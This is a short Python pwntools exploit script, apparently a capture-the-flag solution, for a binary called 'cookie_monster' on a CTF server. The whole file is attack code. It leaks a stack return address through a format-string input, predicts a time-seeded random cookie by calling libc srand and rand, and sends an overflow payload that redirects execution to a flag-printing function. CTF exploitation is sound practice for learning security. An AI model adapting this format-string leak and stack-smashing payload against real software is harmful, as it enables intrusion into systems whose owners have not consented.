from pwn import *
import ctypes

LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

if "rem" in sys.argv:
        proc = remote("ctf.umbccd.io", 4200)
else:
        proc = process("./cookie_monster")

#srand on the current time to get same seed as server
LIBC.srand(LIBC.time(0))

#read return address from stack
print proc.recvuntil("name?")
proc.sendline("%11$lx")
proc.recvline()
addr = proc.recvline()
print addr

#calculate address of function that prints flag
addr = addr.split()[1]
addr = int(addr, 16)
addr = addr + 0x11b5 - 0x134f
print hex(addr)

#send payload
proc.recvuntil("cookie?")
proc.sendline("A"*13 + p32(LIBC.rand()) + "B"*8 + p64(addr))
proc.interactive()
